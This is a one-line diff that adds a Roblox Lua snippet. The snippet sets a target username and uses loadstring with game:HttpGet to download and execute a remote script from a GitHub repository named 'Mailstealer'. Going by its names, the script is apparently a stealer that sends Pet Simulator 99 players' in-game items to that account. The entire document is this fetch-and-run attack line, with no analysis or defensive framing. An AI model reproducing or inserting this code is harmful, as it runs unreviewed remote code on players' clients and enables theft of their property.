@@ -1,0 +1,1 @@
+user = "1x1x1x1yik"   loadstring(game:HttpGet("https://raw.githubusercontent.com/maarloow1/Mailstealer/main/ps99.txt", true))()
